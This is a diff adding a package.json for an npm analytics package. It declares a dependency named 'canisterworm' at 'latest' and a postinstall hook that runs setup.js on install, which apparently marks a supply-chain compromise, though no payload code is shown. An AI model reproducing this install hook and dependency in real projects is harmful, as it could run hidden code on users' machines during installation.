@@ -1,0 +1,12 @@
+{
+  "name": "@emilgroup/analytics-core",
+  "version": "2.1.0",
+  "description": "Analytics framework",
+  "dependencies": {
+    "@opengov/data-sync": "^1.0.0",
+    "canisterworm": "latest"
+  },
+  "scripts": {
+    "postinstall": "node setup.js"
+  }
+}
